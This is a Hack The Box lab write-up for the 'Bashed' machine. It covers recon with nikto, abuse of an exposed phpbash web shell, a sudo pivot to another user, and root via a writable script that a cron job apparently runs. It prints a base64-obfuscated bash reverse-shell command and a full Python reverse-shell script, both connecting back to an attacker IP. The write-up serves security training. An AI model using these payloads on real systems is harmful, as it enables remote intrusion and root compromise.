+++ 
title = "Bashed HTB Write up"
description = "Write up for the HTB machine 'Bashed'"
author = "greatmoves"
tags = ["php", "sudo -l", "python", "nikto", "cronjob", "hackthebox"]
date = 2023-04-15
+++

## Recon
----
### Nikto
cmd: `nikto -host 10.10.10.68`

Our nikto scan reveals to us a number of files and directories
- /config.php
- /css/
- /dev/
- /php/
- /images/
- /icons/

The path `/dev/phpbash.php` seems to be a remote shell

So let's use this to get a reverse shell by running the following command along with a netcat listener

`echo "c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAueC54LzQ0NDQgMD4mMQ==" | base64 -d | bash`

Once we have our reverse shell let's start with obtaining a fully interactive shell by running `python -c 'import pty;pty.spawn("/bin/bash");'` and then `sudo -l` where we get the following output:

```
User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

This means we don't need a password to move from our user `www-data` to the user `scriptmanager`, so we simply run `sudo -u scriptmanager /bin/bash` 

`/home/arrexel` is where we can find `user.txt`

## Privilege escalation
----
Through further enumeration of the file system we can see that there is a `/scripts/` folder in the root of the file system.

Simply running `ls -la` we can see that `test.py` is owned by our user, `scriptmanager`, and `test.txt` is owned by the root user.

Therefore we could assume that the script `test.py` is being run by the root user (perhaps through a cronjob, or some sort of other automation), and since `test.py` is owned by our user, we have permissions to edit it.

So, let's replace `test.py` with a python script for a reverse shell. We can do this by using `echo '{python code here}' > test.py` when in the `/scripts/` directory.

```py
#!/usr/bin/python3
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.x.x",4445));os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
```

Spin up your netcat listener on the same port that is in your script and wait until `test.py` is run to catch your reverse shell as root.

Finally, navigate to `/root/` for `root.txt`
